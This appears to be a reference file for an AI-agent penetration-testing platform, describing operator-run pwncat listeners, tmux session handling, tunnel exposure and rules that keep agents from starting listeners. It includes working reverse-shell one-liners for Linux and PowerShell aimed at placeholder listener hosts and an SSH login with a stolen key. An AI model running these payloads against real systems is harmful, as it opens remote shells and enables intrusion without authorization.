# Shell Handling & Post-Exploitation Listeners

## Architecture

Listeners (pwncat-vl) are OPERATOR-CONTROLLED shared infrastructure.
Agents must never start them. The Kali runtime is shared across engagements — an agent
starting a listener on port 4444 could conflict with another engagement's listener.

**Agent responsibility:** provide the exact commands in `# MANUAL:` playbook steps.
**Operator responsibility:** execute them, record tunnel address in `$DIR/.listener_url`, then signal the agent to continue.

For exposing listeners to remote targets via tunnels, see `agent/references/offensive-tactics/frp-tunneling.md`.
For OOB callback servers (interactsh) and blind vulnerability detection, see `agent/references/offensive-tactics/frp-tunneling.md`.

## pwncat-vl Listener Commands

pwncat-vl is the maintained fork of pwncat-cs with Python 3.13+ support.

### Basic TCP listener
```bash
vigil runtime shell-exec "tmux new-session -d -s shell-4444 'pwncat -l -p 4444 2>&1 | tee /data/shell-4444.log'"
```

### SSL/TLS listener
```bash
vigil runtime shell-exec "tmux new-session -d -s shell-ssl 'pwncat -l -p 4444 --ssl 2>&1 | tee /data/shell-ssl.log'"
```

### Connecting to a bind shell
```bash
vigil runtime shell-exec "tmux new-session -d -s shell-bind 'pwncat -c TARGET_IP -p 4444 2>&1 | tee /data/shell-bind.log'"
```

### SSH-based session (with stolen credentials)
```bash
vigil runtime shell-exec "tmux new-session -d -s shell-ssh 'pwncat -c TARGET_IP -p 22 --ssh --identity /data/stolen_key 2>&1 | tee /data/shell-ssh.log'"
```

## tmux Session Management

### Naming convention
Shell sessions are named `shell-<port>` or `shell-<descriptive-tag>`.
Tunnel sessions use `frp-<name>` (see `frp-tunneling.md`).

### Common commands
Interactive tmux attach is only for manual operator debugging outside agent-executed playbooks.

```bash
# List active sessions
vigil runtime shell-exec "tmux list-sessions"

# Send a command to a running session (non-interactive)
vigil runtime shell-exec "tmux send-keys -t shell-4444 'whoami' Enter"

# Read recent output from the log
vigil runtime shell-exec "tail -50 /data/shell-4444.log"

# Kill a session when done
vigil runtime shell-exec "tmux kill-session -t shell-4444"
```

### Log file visibility

Agents observe shell output through `vigil runtime shell-exec` because shell
listeners are shared runtime infrastructure, not target-facing probes. Record
the important result afterward in the finding, probe-run, or handoff so the
backend remains the durable source of engagement state.

```bash
# Recent shell session output
vigil runtime shell-exec "tail -100 /data/shell-4444.log"

# Full shell session output
vigil runtime shell-exec "cat /data/shell-4444.log"
```

Log files under `/data/` persist across tmux restarts because `/data` is the
shared runtime data mount point.

## Exposing Listeners Externally

After starting a pwncat listener, it is only reachable from the local container network.
To expose it to remote targets, set up an frp tunnel.

**Full tunnel setup commands:** `agent/references/offensive-tactics/frp-tunneling.md`

The `oob-rev` proxy rendered by `vigil oob start` in `/data/oob/frpc.toml` handles this. After `vigil oob start` is healthy, record the address:
```bash
echo "researcher.example:8443" > "$DIR/.listener_url"
```

Agents read `LISTENER_HOST` and `LISTENER_PORT` from `$DIR/.listener_url` (or from dispatch context)
instead of hardcoding tunnel addresses.

## Reverse Shell Payloads

These are what agents embed in exploit commands. The `LISTENER_HOST` and `LISTENER_PORT`
values come from the operator after they set up the listener and tunnel.

### Linux
```bash
# Bash TCP
bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1

# Python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LISTENER_HOST",LISTENER_PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Netcat (if available on target)
nc -e /bin/bash LISTENER_HOST LISTENER_PORT

# Netcat without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LISTENER_HOST LISTENER_PORT >/tmp/f
```

### Windows
```powershell
# PowerShell one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
```

## Agent Rules

Agents **MUST NOT:**
- Start `pwncat`, `nc -lvp`, `socat` as a listener, or any listening socket
- Start frp tunnels or `chisel server`
- Kill or restart existing listener or tunnel sessions

Agents **CAN:**
- Read listener log files with `vigil runtime shell-exec "tail -80 /data/shell-<name>.log"`, then record the meaningful result in the backend
- Read correlated OOB hits with `vigil oob poll --client <name> --json` (the nonce↔probe matches); `vigil oob client logs <name> --lines 80` is the raw per-client listener tail, not correlation
- Read raw OOB infrastructure logs with `vigil logs oob --lines 80`
- Provide reverse shell payloads for the operator to deploy
- Verify that a shell connected by checking log output
- Provide authorized runtime commands such as `vigil runtime shell-exec "tmux send-keys -t shell-4444 'whoami' Enter"` for the operator to run

Agents **MUST:**
- Mark shell-catching steps as `# MANUAL:` in playbooks
- Include the full listener commands the operator should run
- Reference this file (`agent/references/offensive-tactics/shell-handling.md`) for listener setup
- Reference `agent/references/offensive-tactics/frp-tunneling.md` for tunnel and OOB setup
- Wait for operator confirmation before proceeding past a manual step
